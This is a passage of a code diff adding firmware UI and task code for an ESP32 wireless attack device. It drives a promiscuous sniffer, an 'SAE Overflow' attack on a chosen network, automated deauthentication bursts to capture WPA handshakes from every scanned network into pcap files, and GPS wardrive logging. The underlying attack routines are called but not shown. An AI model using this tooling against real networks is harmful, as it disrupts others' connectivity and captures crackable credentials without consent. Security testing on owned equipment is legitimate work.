+            ESP_LOGE(TAG, "Failed to create sniffer_dog task");
+            heap_caps_free(sniffer_dog_task_stack);
+            sniffer_dog_task_stack = NULL;
+        } else {
+            ESP_LOGI(TAG, "Snifferdog task created with PSRAM stack");
+        }
+    } else {
+        ESP_LOGE(TAG, "Failed to allocate sniffer_dog task stack from PSRAM");
+    }
+    
+    ESP_LOGI(TAG, "Snifferdog started - hunting for AP-STA pairs...");
+}
+
+static void snifferdog_stop_btn_cb(lv_event_t *e)
+{
+    (void)e;
+    
+    // Stop snifferdog attack
+    if (sniffer_dog_active || sniffer_dog_task_handle != NULL) {
+        ESP_LOGI(TAG, "Stopping Snifferdog...");
+        sniffer_dog_active = false;
+        
+        // Wait for task to finish
+        for (int i = 0; i < 20 && sniffer_dog_task_handle != NULL; i++) {
+            vTaskDelay(pdMS_TO_TICKS(50));
+        }
+        
+        // Force delete if still running
+        if (sniffer_dog_task_handle != NULL) {
+            vTaskDelete(sniffer_dog_task_handle);
+            sniffer_dog_task_handle = NULL;
+            // Free PSRAM stack
+            if (sniffer_dog_task_stack != NULL) {
+                heap_caps_free(sniffer_dog_task_stack);
+                sniffer_dog_task_stack = NULL;
+            }
+        }
+        
+        esp_wifi_set_promiscuous(false);
+        sniffer_dog_channel_index = 0;
+        sniffer_dog_current_channel = dual_band_channels[0];
+        sniffer_dog_last_channel_hop = 0;
+        
+        ESP_LOGI(TAG, "Snifferdog stopped");
+    }
+    snifferdog_disable_log_capture();
+    snifferdog_log_ta = NULL;
+    snifferdog_stop_btn = NULL;
+    snifferdog_ui_active = false;  // Clear snifferdog UI active flag
+    scan_done_ui_flag = false;  // Clear any pending scan done flag
+    // Navigate back to menu
+    nav_to_menu_flag = true;
+}
+
+static void sniffer_yes_btn_cb(lv_event_t *e)
+{
+    (void)e;
+    
+    // Set sniffer UI active flag
+    sniffer_ui_active = true;
+    scan_done_ui_flag = false;  // Clear any pending scan done flag
+    
+    // Delete the warning page content
+    if (function_page) {
+        lv_obj_clean(function_page);
+    }
+    
+    // Create log display page
+    sniffer_log_ta = lv_textarea_create(function_page);
+    lv_obj_set_size(sniffer_log_ta, lv_pct(100), LCD_V_RES - 30 - 50);
+    lv_obj_align(sniffer_log_ta, LV_ALIGN_TOP_MID, 0, 30);
+    lv_textarea_set_text(sniffer_log_ta, "Starting WiFi Sniffer...\n");
+    lv_obj_set_style_bg_color(sniffer_log_ta, lv_color_make(0, 0, 0), 0);  // Black background
+    lv_obj_set_style_text_color(sniffer_log_ta, lv_color_make(0, 255, 0), 0);  // Green text
+    lv_obj_set_style_border_color(sniffer_log_ta, lv_color_make(0, 255, 0), 0);  // Green border
+    lv_obj_set_style_border_width(sniffer_log_ta, 2, 0);
+    lv_obj_clear_state(sniffer_log_ta, LV_STATE_FOCUSED);  // Hide cursor
+    
+    // Create Enough button at bottom
+    sniffer_stop_btn = lv_btn_create(function_page);
+    lv_obj_set_size(sniffer_stop_btn, lv_pct(100), 45);
+    lv_obj_align(sniffer_stop_btn, LV_ALIGN_BOTTOM_MID, 0, 0);
+    lv_obj_set_style_bg_color(sniffer_stop_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black button
+    lv_obj_set_style_bg_color(sniffer_stop_btn, lv_color_make(0, 50, 0), LV_STATE_PRESSED);  // Dark green when pressed
+    lv_obj_set_style_border_color(sniffer_stop_btn, lv_color_make(0, 255, 0), 0);  // Green border
+    lv_obj_set_style_border_width(sniffer_stop_btn, 3, 0);
+    lv_obj_t *enough_lbl = lv_label_create(sniffer_stop_btn);
+    lv_label_set_text(enough_lbl, "Enough");
+    lv_obj_set_style_text_color(enough_lbl, lv_color_make(0, 255, 0), 0);  // Green text
+    lv_obj_center(enough_lbl);
+    lv_obj_add_event_cb(sniffer_stop_btn, sniffer_enough_btn_cb, LV_EVENT_CLICKED, NULL);
+    
+    // Enable log capture
+    sniffer_enable_log_capture();
+    
+    // Start sniffer task (custom implementation using wifi_sniffer.h)
+    if (sniffer_task_active) {
+        ESP_LOGI(TAG, "Sniffer already active");
+        return;
+    }
+    
+    ESP_LOGI(TAG, "Starting WiFi Sniffer...");
+    sniffer_task_active = true;
+    
+    // Create sniffer task with PSRAM stack
+    sniffer_task_stack = (StackType_t *)heap_caps_malloc(4096 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
+    if (sniffer_task_stack != NULL) {
+        sniffer_task_handle = xTaskCreateStatic(sniffer_task, "sniffer", 4096, NULL, 
+            5, sniffer_task_stack, &sniffer_task_buffer);
+        if (sniffer_task_handle == NULL) {
+            ESP_LOGE(TAG, "Failed to create sniffer task");
+            heap_caps_free(sniffer_task_stack);
+            sniffer_task_stack = NULL;
+            sniffer_task_active = false;
+        } else {
+            ESP_LOGI(TAG, "Sniffer task created with PSRAM stack");
+        }
+    } else {
+        ESP_LOGE(TAG, "Failed to allocate sniffer task stack from PSRAM");
+        sniffer_task_active = false;
+    }
+}
+
+static void sniffer_enough_btn_cb(lv_event_t *e)
+{
+    (void)e;
+    
+    // Stop sniffer task
+    if (sniffer_task_active || sniffer_task_handle != NULL) {
+        ESP_LOGI(TAG, "Stopping WiFi Sniffer...");
+        sniffer_task_active = false;
+        
+        // Wait for task to finish
+        for (int i = 0; i < 20 && sniffer_task_handle != NULL; i++) {
+            vTaskDelay(pdMS_TO_TICKS(50));
+        }
+        
+        // Force delete if still running
+        if (sniffer_task_handle != NULL) {
+            vTaskDelete(sniffer_task_handle);
+            sniffer_task_handle = NULL;
+            // Free PSRAM stack
+            if (sniffer_task_stack != NULL) {
+                heap_caps_free(sniffer_task_stack);
+                sniffer_task_stack = NULL;
+            }
+        }
+        
+        ESP_LOGI(TAG, "Sniffer stopped");
+    }
+    sniffer_disable_log_capture();
+    sniffer_log_ta = NULL;
+    sniffer_stop_btn = NULL;
+    sniffer_ui_active = false;  // Clear sniffer UI active flag
+    scan_done_ui_flag = false;  // Clear any pending scan done flag
+    // Navigate back to menu
+    nav_to_menu_flag = true;
+}
+
+static void sae_overflow_yes_btn_cb(lv_event_t *e)
+{
+    (void)e;
+    
+    // Check if a network is selected
+    const wifi_ap_record_t *records = wifi_scanner_get_results_ptr();
+    
+    // Get selected network count and index
+    int selected_count = wifi_scanner_get_selected_count();
+    int selected_indices[1];
+    int selected_index = -1;
+    
+    if (selected_count > 0) {
+        wifi_scanner_get_selected(selected_indices, 1);
+        selected_index = selected_indices[0];
+    }
+    
+    // SAE Overflow requires exactly ONE selected network
+    if (selected_count != 1) {
+        // Show error message
+        if (function_page) {
+            lv_obj_clean(function_page);
+        }
+        
+        lv_obj_t *error_label = lv_label_create(function_page);
+        lv_label_set_text(error_label, "SAE Overflow requires\nexactly ONE network.\n\nPlease scan and select\none network.");
+        lv_obj_set_style_text_align(error_label, LV_TEXT_ALIGN_CENTER, 0);
+        lv_obj_set_style_text_color(error_label, lv_color_make(0, 255, 0), 0);
+        lv_obj_set_style_text_font(error_label, &lv_font_montserrat_16, 0);
+        lv_obj_center(error_label);
+        
+        // Back button
+        lv_obj_t *back_btn = lv_btn_create(function_page);
+        lv_obj_set_size(back_btn, lv_pct(90), LV_SIZE_CONTENT);
+        lv_obj_align(back_btn, LV_ALIGN_BOTTOM_MID, 0, -15);
+        lv_obj_set_style_bg_color(back_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);
+        lv_obj_set_style_bg_color(back_btn, lv_color_make(0, 50, 0), LV_STATE_PRESSED);
+        lv_obj_set_style_border_color(back_btn, lv_color_make(0, 255, 0), 0);
+        lv_obj_set_style_border_width(back_btn, 2, 0);
+        lv_obj_t *back_lbl = lv_label_create(back_btn);
+        lv_label_set_text(back_lbl, "BACK");
+        lv_obj_set_style_text_color(back_lbl, lv_color_make(0, 255, 0), 0);
+        lv_obj_center(back_lbl);
+        lv_obj_add_event_cb(back_btn, back_to_menu_cb, LV_EVENT_CLICKED, NULL);
+        
+        return;
+    }
+    
+    // Set SAE overflow UI active flag
+    sae_overflow_ui_active = true;
+    scan_done_ui_flag = false;
+    
+    // Delete the warning page content
+    if (function_page) {
+        lv_obj_clean(function_page);
+    }
+    
+    // Create log display page
+    sae_overflow_log_ta = lv_textarea_create(function_page);
+    lv_obj_set_size(sae_overflow_log_ta, lv_pct(100), LCD_V_RES - 30 - 50);
+    lv_obj_align(sae_overflow_log_ta, LV_ALIGN_TOP_MID, 0, 30);
+    lv_textarea_set_text(sae_overflow_log_ta, "Starting SAE Overflow Attack...\n");
+    lv_obj_set_style_bg_color(sae_overflow_log_ta, lv_color_make(0, 0, 0), 0);
+    lv_obj_set_style_text_color(sae_overflow_log_ta, lv_color_make(0, 255, 0), 0);
+    lv_obj_set_style_border_color(sae_overflow_log_ta, lv_color_make(0, 255, 0), 0);
+    lv_obj_set_style_border_width(sae_overflow_log_ta, 2, 0);
+    lv_obj_clear_state(sae_overflow_log_ta, LV_STATE_FOCUSED);
+    
+    // Create Stop button at bottom
+    sae_overflow_stop_btn = lv_btn_create(function_page);
+    lv_obj_set_size(sae_overflow_stop_btn, lv_pct(100), 45);
+    lv_obj_align(sae_overflow_stop_btn, LV_ALIGN_BOTTOM_MID, 0, 0);
+    lv_obj_set_style_bg_color(sae_overflow_stop_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_color(sae_overflow_stop_btn, lv_color_make(0, 50, 0), LV_STATE_PRESSED);
+    lv_obj_set_style_border_color(sae_overflow_stop_btn, lv_color_make(0, 255, 0), 0);
+    lv_obj_set_style_border_width(sae_overflow_stop_btn, 3, 0);
+    lv_obj_t *stop_lbl = lv_label_create(sae_overflow_stop_btn);
+    lv_label_set_text(stop_lbl, "STOP");
+    lv_obj_set_style_text_color(stop_lbl, lv_color_make(0, 255, 0), 0);
+    lv_obj_center(stop_lbl);
+    lv_obj_add_event_cb(sae_overflow_stop_btn, sae_overflow_stop_btn_cb, LV_EVENT_CLICKED, NULL);
+    
+    // Enable log capture
+    sae_overflow_enable_log_capture();
+    
+    // Get selected network info
+    char ssid[33];
+    if (records[selected_index].ssid[0]) {
+        snprintf(ssid, sizeof(ssid), "%s", (const char *)records[selected_index].ssid);
+    } else {
+        snprintf(ssid, sizeof(ssid), "%02X%02X%02X%02X%02X%02X",
+                 records[selected_index].bssid[0], records[selected_index].bssid[1], records[selected_index].bssid[2],
+                 records[selected_index].bssid[3], records[selected_index].bssid[4], records[selected_index].bssid[5]);
+    }
+    
+    char header[160];
+    snprintf(header, sizeof(header), "Launching SAE Overflow for %s\n", ssid);
+    lv_textarea_add_text(sae_overflow_log_ta, header);
+    lv_textarea_set_cursor_pos(sae_overflow_log_ta, LV_TEXTAREA_CURSOR_LAST);
+    
+    // Save selected network as target
+    wifi_scanner_save_target_bssids();
+    
+    // Start SAE overflow attack
+    esp_err_t start_res = wifi_attacks_start_sae_overflow();
+    if (start_res != ESP_OK) {
+        char err[96];
+        snprintf(err, sizeof(err), "Start failed: %s\n", esp_err_to_name(start_res));
+        lv_textarea_add_text(sae_overflow_log_ta, err);
+        sae_overflow_disable_log_capture();
+        return;
+    }
+    
+    lv_textarea_add_text(sae_overflow_log_ta, "SAE Overflow started. Awaiting log output...\n");
+    lv_textarea_set_cursor_pos(sae_overflow_log_ta, LV_TEXTAREA_CURSOR_LAST);
+    
+    show_touch_dot = false;
+    if (touch_dot) {
+        lv_obj_add_flag(touch_dot, LV_OBJ_FLAG_HIDDEN);
+    }
+}
+
+static void sae_overflow_stop_btn_cb(lv_event_t *e)
+{
+    (void)e;
+    // Stop SAE overflow attack
+    wifi_attacks_stop_all();
+    sae_overflow_disable_log_capture();
+    sae_overflow_log_ta = NULL;
+    sae_overflow_stop_btn = NULL;
+    sae_overflow_ui_active = false;
+    scan_done_ui_flag = false;
+    // Navigate back to menu
+    nav_to_menu_flag = true;
+}
+
+static bool check_handshake_file_exists(const char *ssid) {
+    if (!ssid || strlen(ssid) == 0) {
+        return false;
+    }
+    
+    // Take SD/SPI mutex before any filesystem operations
+    // SD card and display share the same SPI bus!
+    if (sd_spi_mutex && xSemaphoreTake(sd_spi_mutex, pdMS_TO_TICKS(5000)) != pdTRUE) {
+        ESP_LOGW(TAG, "Failed to take SD/SPI mutex in check_handshake_file_exists");
+        return false;
+    }
+    
+    bool found = false;
+    
+    // Check if /sdcard/lab/handshakes exists
+    struct stat st;
+    if (stat("/sdcard/lab/handshakes", &st) != 0) {
+        if (sd_spi_mutex) xSemaphoreGive(sd_spi_mutex);
+        return false; // Directory doesn't exist
+    }
+    
+    // Open directory and check for files starting with SSID
+    DIR *dir = opendir("/sdcard/lab/handshakes");
+    if (!dir) {
+        if (sd_spi_mutex) xSemaphoreGive(sd_spi_mutex);
+        return false;
+    }
+    
+    struct dirent *entry;
+    while ((entry = readdir(dir)) != NULL) {
+        if (strncmp(entry->d_name, ssid, strlen(ssid)) == 0 && strstr(entry->d_name, ".pcap") != NULL) {
+            found = true;
+            break;
+        }
+    }
+    
+    closedir(dir);
+    
+    // Release SD/SPI mutex
+    if (sd_spi_mutex) xSemaphoreGive(sd_spi_mutex);
+    
+    return found;
+}
+
+static void handshake_cleanup(void) {
+    ESP_LOGI(TAG, "Cleaning up handshake attack...");
+    
+    // Stop any running attack
+    attack_handshake_stop();
+    
+    // Reset state
+    handshake_attack_active = false;
+    handshake_target_count = 0;
+    handshake_current_index = 0;
+    handshake_selected_mode = false;
+    
+    // NOTE: Stack is freed by the caller (stop button), not here
+    // to avoid race condition when task is still running
+}
+
+static void attack_network_with_burst(const wifi_ap_record_t *ap) {
+    ESP_LOGI(TAG, "Burst attacking '%s' (Ch %d, RSSI: %d dBm)", 
+                ap->ssid, ap->primary, ap->rssi);
+    
+    // Start attack on this network
+    attack_handshake_start(ap, ATTACK_HANDSHAKE_METHOD_BROADCAST);
+    
+    // Send bursts with waits - 3 bursts total
+    for (int burst = 0; burst < 3 && handshake_attack_active && !g_operation_stop_requested; burst++) {
+        // Wait 1 second, then send next burst (first burst already sent by start)
+        if (burst > 0) {
+            attack_handshake_send_deauth_burst();
+        }
+        
+        // Wait 3 seconds for clients to reconnect after deauth
+        for (int i = 0; i < 30 && handshake_attack_active && !g_operation_stop_requested; i++) {
+            vTaskDelay(pdMS_TO_TICKS(100));
+            
+            // Check if handshake captured
+            if (attack_handshake_is_complete()) {
+                ESP_LOGI(TAG, "✓ Handshake captured for '%s' after burst #%d!", 
+                           ap->ssid, burst + 1);
+                
+                // Wait 2s to capture any remaining frames
+                vTaskDelay(pdMS_TO_TICKS(2000));
+                attack_handshake_stop();
+                return; // Success!
+            }
+        }
+        
+        ESP_LOGI(TAG, "Burst #%d complete, trying next...", burst + 1);
+    }
+    
+    // No handshake captured after 3 bursts
+    ESP_LOGI(TAG, "✗ No handshake for '%s' after 3 bursts", ap->ssid);
+    attack_handshake_stop();
+}
+
+static void handshake_attack_task(void *pvParameters) {
+    (void)pvParameters;
+    
+    ESP_LOGI(TAG, "Handshake attack task started.");
+    ESP_LOGI(TAG, "Mode: %s", handshake_selected_mode ? "Selected networks only" : "Scan all networks");
+    
+    // CRITICAL: Wait before ANY SD card operations to avoid SPI bus conflict with LVGL display
+    // The SD card and display share the same SPI bus. If we access SD immediately after task
+    // creation (especially check_handshake_file_exists), it will crash with SPI assert.
+    // Give LVGL time to finish any ongoing display updates.
+    vTaskDelay(pdMS_TO_TICKS(500));
+    
+    int64_t last_scan_time = 0;
+    const int64_t SCAN_INTERVAL_US = 5 * 60 * 1000000; // 5 minutes in microseconds
+    
+    while (handshake_attack_active && !g_operation_stop_requested) {
+        // In scan-all mode, perform periodic scans
+        if (!handshake_selected_mode) {
+            int64_t current_time = esp_timer_get_time();
+            if (current_time - last_scan_time >= SCAN_INTERVAL_US || handshake_target_count == 0) {
+                ESP_LOGI(TAG, "Performing scan for networks...");
+                
+                // Start scan using wifi_scanner
+                esp_err_t scan_result = wifi_scanner_start_scan();
+                if (scan_result != ESP_OK) {
+                    ESP_LOGI(TAG, "Failed to start scan: %s", esp_err_to_name(scan_result));
+                    vTaskDelay(pdMS_TO_TICKS(5000));
+                    continue;
+                }
+                
+                // Wait for scan to complete
+                ESP_LOGI(TAG, "Waiting for scan to complete...");
+                int timeout = 0;
+                while (timeout < 200 && handshake_attack_active && !g_operation_stop_requested) {
+                    uint16_t count = wifi_scanner_get_count();
+                    if (count > 0) {
+                        // Scan completed
+                        break;
+                    }
+                    vTaskDelay(pdMS_TO_TICKS(100));
+                    timeout++;
+                }
+                
+                if (g_operation_stop_requested) {
+                    ESP_LOGI(TAG, "Stop requested during scan, terminating...");
+                    break;
+                }
+                
+                // Get scan results
+                uint16_t count = wifi_scanner_get_count();
+                if (count == 0) {
+                    ESP_LOGI(TAG, "Scan failed or no results, retrying in 5 seconds...");
+                    vTaskDelay(pdMS_TO_TICKS(5000));
+                    continue;
+                }
+                
+                // Copy scan results to handshake targets
+                handshake_target_count = (count < MAX_AP_CNT) ? count : MAX_AP_CNT;
+                
+                // Get results from scanner
+                wifi_ap_record_t temp_results[MAX_AP_CNT];
+                int got = wifi_scanner_get_results(temp_results, handshake_target_count);
+                if (got > 0) {
+                    memcpy(handshake_targets, temp_results, got * sizeof(wifi_ap_record_t));
+                    handshake_target_count = got;
+                    handshake_current_index = 0;
+                    
+                    ESP_LOGI(TAG, "Found %d networks to attack", handshake_target_count);
+                    last_scan_time = current_time;
+                } else {
+                    ESP_LOGI(TAG, "Failed to get scan results, retrying...");
+                    vTaskDelay(pdMS_TO_TICKS(5000));
+                    continue;
+                }
+            }
+        }
+        
+        // Attack all target networks
+        ESP_LOGI(TAG, "");
+        if (handshake_selected_mode) {
+            ESP_LOGI(TAG, "===== Attacking Selected Networks =====");
+        } else {
+            ESP_LOGI(TAG, "===== PHASE 2: Attack All Networks =====");
+        }
+        ESP_LOGI(TAG, "Attacking %d networks...", handshake_target_count);
+        
+        int attacked_count = 0;
+        int captured_count = 0;
+        
+        for (int i = 0; i < handshake_target_count && handshake_attack_active && !g_operation_stop_requested; i++) {
+            wifi_ap_record_t *ap = &handshake_targets[i];
+            
+            // Skip if already captured
+            if (handshake_captured[i]) {
+                captured_count++;
+                continue;
+            }
+            
+            // Check if file already exists (skip for empty/hidden SSIDs)
+            if (ap->ssid[0] != '\0' && check_handshake_file_exists((const char*)ap->ssid)) {
+                ESP_LOGI(TAG, "[%d/%d] Skipping '%s' - PCAP already exists", 
+                           i + 1, handshake_target_count, (const char*)ap->ssid);
+                handshake_captured[i] = true;
+                captured_count++;
+                continue;
+            }
+            
+            attacked_count++;
+            ESP_LOGI(TAG, "");
+            ESP_LOGI(TAG, ">>> [%d/%d] Attacking '%s' (Ch %d, RSSI: %d dBm) <<<", 
+                       i + 1, handshake_target_count, (const char*)ap->ssid, ap->primary, ap->rssi);
+            
+            // Attack with burst strategy
+            attack_network_with_burst(ap);
+            
+            // Check if captured
+            if (attack_handshake_is_complete()) {
+                handshake_captured[i] = true;
+                captured_count++;
+                ESP_LOGI(TAG, "✓✓✓ Handshake #%d captured! ✓✓✓", captured_count);
+            }
+            
+            // Delay before next network
+            if (i < handshake_target_count - 1) {
+                ESP_LOGI(TAG, "Cooling down 2s before next network...");
+                vTaskDelay(pdMS_TO_TICKS(2000));
+            }
+        }
+        
+        ESP_LOGI(TAG, "");
+        ESP_LOGI(TAG, "===== Attack Cycle Complete =====");
+        ESP_LOGI(TAG, "Total networks: %d", handshake_target_count);
+        ESP_LOGI(TAG, "Networks attacked this cycle: %d", attacked_count);
+        ESP_LOGI(TAG, "Handshakes captured so far: %d", captured_count);
+        
+        // Check if all selected networks captured (for selected mode)
+        if (handshake_selected_mode) {
+            bool all_done = true;
+            int remaining = 0;
+            for (int i = 0; i < handshake_target_count; i++) {
+                if (!handshake_captured[i]) {
+                    all_done = false;
+                    remaining++;
+                }
+            }
+            
+            if (all_done) {
+                ESP_LOGI(TAG, "✓✓✓ All selected networks captured! Attack complete. ✓✓✓");
+                break;
+            }
+            
+            // Continue looping until all captured
+            ESP_LOGI(TAG, "Selected mode: %d networks still need handshakes, repeating attack cycle...", remaining);
+            vTaskDelay(pdMS_TO_TICKS(3000)); // Small delay before next loop
+        } else {
+            // In scan-all mode, done after one cycle (no periodic scan in GUI mode)
+            ESP_LOGI(TAG, "Scan-all mode: Attack cycle complete.");
+            break;
+        }
+    }
+    
+    // Cleanup
+    ESP_LOGI(TAG, "Handshake attack task finished.");
+    handshake_cleanup();
+    
+    // NOTE: Do NOT set handshake_attack_task_handle to NULL here!
+    // The stop button will do that after vTaskDelete completes.
+    // Setting it to NULL here creates a race condition where the stop button
+    // might try to free the stack while we're still using it.
+    
+    // Delete self - must be last line
+    vTaskDelete(NULL);
+}
+
+static void handshake_yes_btn_cb(lv_event_t *e)
+{
+    (void)e;
+    
+    // Check if handshake attack is already running
+    if (handshake_attack_active || handshake_attack_task_handle != NULL) {
+        ESP_LOGW(TAG, "Handshake attack already running");
+        return;
+    }
+    
+    // Reset stop flag
+    g_operation_stop_requested = false;
+    
+    // Initialize state
+    handshake_target_count = 0;
+    handshake_current_index = 0;
+    memset(handshake_targets, 0, sizeof(handshake_targets));
+    memset(handshake_captured, 0, sizeof(handshake_captured));
+    
+    // Set handshake UI active flag
+    handshake_ui_active = true;
+    scan_done_ui_flag = false;
+    
+    // Delete the warning page content
+    if (function_page) {
+        lv_obj_clean(function_page);
+    }
+    
+    // Create log display page
+    handshake_log_ta = lv_textarea_create(function_page);
+    lv_obj_set_size(handshake_log_ta, lv_pct(100), LCD_V_RES - 30 - 50);
+    lv_obj_align(handshake_log_ta, LV_ALIGN_TOP_MID, 0, 30);
+    lv_textarea_set_text(handshake_log_ta, "Starting WPA Handshake Capture...\n");
+    lv_obj_set_style_bg_color(handshake_log_ta, lv_color_make(0, 0, 0), 0);
+    lv_obj_set_style_text_color(handshake_log_ta, lv_color_make(0, 255, 0), 0);
+    lv_obj_set_style_border_color(handshake_log_ta, lv_color_make(0, 255, 0), 0);
+    lv_obj_set_style_border_width(handshake_log_ta, 2, 0);
+    lv_obj_clear_state(handshake_log_ta, LV_STATE_FOCUSED);
+    
+    // Create Stop button at bottom
+    handshake_stop_btn = lv_btn_create(function_page);
+    lv_obj_set_size(handshake_stop_btn, lv_pct(100), 45);
+    lv_obj_align(handshake_stop_btn, LV_ALIGN_BOTTOM_MID, 0, 0);
+    lv_obj_set_style_bg_color(handshake_stop_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_color(handshake_stop_btn, lv_color_make(0, 50, 0), LV_STATE_PRESSED);
+    lv_obj_set_style_border_color(handshake_stop_btn, lv_color_make(0, 255, 0), 0);
+    lv_obj_set_style_border_width(handshake_stop_btn, 3, 0);
+    lv_obj_t *stop_lbl = lv_label_create(handshake_stop_btn);
+    lv_label_set_text(stop_lbl, "STOP");
+    lv_obj_set_style_text_color(stop_lbl, lv_color_make(0, 255, 0), 0);
+    lv_obj_center(stop_lbl);
+    lv_obj_add_event_cb(handshake_stop_btn, handshake_stop_btn_cb, LV_EVENT_CLICKED, NULL);
+    
+    // Enable log capture
+    handshake_enable_log_capture();
+    
+    // Check if networks were selected
+    if (g_shared_selected_count > 0) {
+        // Selected networks mode
+        handshake_selected_mode = true;
+        handshake_target_count = g_shared_selected_count;
+        
+        char header[160];
+        snprintf(header, sizeof(header), "Selected Networks Mode\nTargets: %d network(s)\n", g_shared_selected_count);
+        lv_textarea_add_text(handshake_log_ta, header);
+        
+        // Copy selected networks to handshake targets
+        for (int i = 0; i < g_shared_selected_count; i++) {
+            int idx = g_shared_selected_indices[i];
+            memcpy(&handshake_targets[i], &g_shared_scan_results[idx], sizeof(wifi_ap_record_t));
+        }
+    } else {
+        // Scan-all mode
+        handshake_selected_mode = false;
+        
+        lv_textarea_add_text(handshake_log_ta, "Scan All Mode\nNo networks selected - will scan and attack all\n");
+        
+        // Use existing scan results if available
+        if (g_shared_scan_count > 0) {
+            handshake_target_count = (g_shared_scan_count < MAX_AP_CNT) ? g_shared_scan_count : MAX_AP_CNT;
+            memcpy(handshake_targets, g_shared_scan_results, handshake_target_count * sizeof(wifi_ap_record_t));
+        }
+    }
+    
+    lv_textarea_add_text(handshake_log_ta, "Starting handshake attack task...\n");
+    lv_textarea_set_cursor_pos(handshake_log_ta, LV_TEXTAREA_CURSOR_LAST);
+    
+    // Start handshake attack task
+    handshake_attack_active = true;
+    
+    // Allocate task stack from PSRAM (32KB for safety - vfprintf needs a lot)
+    handshake_attack_task_stack = (StackType_t *)heap_caps_malloc(32768 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
+    if (handshake_attack_task_stack != NULL) {
+        handshake_attack_task_handle = xTaskCreateStatic(
+            handshake_attack_task,
+            "handshake_attac",  // Max 15 chars for task name
+            32768,  // Stack size - 32KB in PSRAM
+            NULL,
+            5,     // Priority
+            handshake_attack_task_stack,
+            &handshake_attack_task_buffer
+        );
+        if (handshake_attack_task_handle == NULL) {
+            ESP_LOGE(TAG, "Failed to create handshake attack task!");
+            handshake_attack_active = false;
+            heap_caps_free(handshake_attack_task_stack);
+            handshake_attack_task_stack = NULL;
+            lv_textarea_add_text(handshake_log_ta, "ERROR: Failed to create task\n");
+        } else {
+            ESP_LOGI(TAG, "Handshake attack task created with PSRAM stack (32KB)");
+        }
+    } else {
+        ESP_LOGE(TAG, "Failed to allocate PSRAM stack for handshake attack task!");
+        handshake_attack_active = false;
+        lv_textarea_add_text(handshake_log_ta, "ERROR: Failed to allocate PSRAM stack\n");
+    }
+    
+    show_touch_dot = false;
+    if (touch_dot) {
+        lv_obj_add_flag(touch_dot, LV_OBJ_FLAG_HIDDEN);
+    }
+}
+
+static void handshake_stop_btn_cb(lv_event_t *e)
+{
+    (void)e;
+    
+    // Set stop flag
+    g_operation_stop_requested = true;
+    
+    // Stop current attack if running
+    attack_handshake_stop();
+    
+    // Wait for task to finish
+    if (handshake_attack_task_handle != NULL) {
+        ESP_LOGI(TAG, "Stopping handshake attack task...");
+        
+        // Wait for task to finish naturally (max 10 seconds)
+        int wait_count = 0;
+        while (wait_count < 100) {  // 10 seconds max
+            // Check if task still exists
+            eTaskState task_state = eTaskGetState(handshake_attack_task_handle);
+            if (task_state == eDeleted || task_state == eInvalid) {
+                ESP_LOGI(TAG, "Handshake attack task finished naturally.");
+                break;
+            }
+            vTaskDelay(pdMS_TO_TICKS(100));
+            wait_count++;
+        }
+        
+        // If task still running, force delete it
+        eTaskState task_state = eTaskGetState(handshake_attack_task_handle);
+        if (task_state != eDeleted && task_state != eInvalid) {
+            ESP_LOGW(TAG, "Handshake attack task forcefully stopped.");
+            vTaskDelete(handshake_attack_task_handle);
+        }
+        
+        // Always clear handle after task is deleted
+        handshake_attack_task_handle = NULL;
+        
+        // Give extra time for task resources to be fully released
+        vTaskDelay(pdMS_TO_TICKS(500));
+    }
+    
+    // Free PSRAM stack (only after task is completely done)
+    if (handshake_attack_task_stack != NULL) {
+        ESP_LOGI(TAG, "Freeing handshake task PSRAM stack...");
+        heap_caps_free(handshake_attack_task_stack);
+        handshake_attack_task_stack = NULL;
+    }
+    
+    handshake_attack_active = false;
+    handshake_disable_log_capture();
+    handshake_log_ta = NULL;
+    handshake_stop_btn = NULL;
+    handshake_ui_active = false;
+    scan_done_ui_flag = false;
+    
+    ESP_LOGI(TAG, "All operations stopped.");
+    
+    // Navigate back to menu
+    nav_to_menu_flag = true;
+}
+
+// Wardrive task (from original project)
+static void wardrive_task(void *pvParameters) {
+    (void)pvParameters;
+    
+    ESP_LOGI(TAG, "Wardrive task started");
+    
+    // Use timestamp-based filename instead of scanning SD to avoid SPI conflicts with LVGL
+    wardrive_file_counter = (int)(esp_timer_get_time() / 1000000);  // Unix timestamp in seconds
+    ESP_LOGI(TAG, "Wardrive file will be: w%d.log", wardrive_file_counter);
+    
+    ESP_LOGI(TAG, "Waiting for GPS fix...");
+    if (!wait_for_gps_fix(120)) {
+        ESP_LOGI(TAG, "Warning: No GPS fix obtained, not continuing without GPS data");
+        wardrive_active = false;
+    } else {
+        ESP_LOGI(TAG, "GPS fix obtained");
+    }
+    
+    ESP_LOGI(TAG, "Wardrive started. Use Stop to stop");
+    
+    // Open file once at the beginning to minimize SPI conflicts
+    char filename[64];
+    snprintf(filename, sizeof(filename), "/sdcard/lab/wardrives/w%d.log", wardrive_file_counter);
+    
+    FILE *file = fopen(filename, "a");
+    if (file == NULL) {
+        file = fopen(filename, "w");
+        if (file == NULL) {
+            ESP_LOGI(TAG, "Failed to create file %s - aborting wardrive", filename);
+            wardrive_active = false;
+            wardrive_task_handle = NULL;
+            vTaskDelete(NULL);
+            return;
+        }
+    }
+    
+    // Write header if file is new
+    fseek(file, 0, SEEK_END);
+    if (ftell(file) == 0) {
+        fprintf(file, "WigleWifi-1.4,appRelease=v1.1,model=Gen4,release=v1.0,device=Gen4Board\n");
+        fprintf(file, "MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,CurrentLatitude,CurrentLongitude,AltitudeMeters,AccuracyMeters,Type\n");
+        fflush(file);  // Flush header
+    }
+    
+    int scan_counter = 0;
+    while (wardrive_active) {
+        if (!wardrive_active) {
+            ESP_LOGI(TAG, "Wardrive: Stop requested");
+            break;
+        }
+        
+        // Read GPS data
+        int len = uart_read_bytes(GPS_UART_NUM, (uint8_t*)wardrive_gps_buffer, GPS_BUF_SIZE - 1, pdMS_TO_TICKS(100));
+        if (len > 0) {
+            wardrive_gps_buffer[len] = '\0';
+            char* line = strtok(wardrive_gps_buffer, "\r\n");
+            while (line != NULL) {
+                parse_gps_nmea(line);
+                line = strtok(NULL, "\r\n");
+            }
+        }
+        
+        // Use wifi_scanner API instead of direct ESP-IDF calls
+        if (!wardrive_active) break;
+        
+        // Start scan using wifi_scanner component
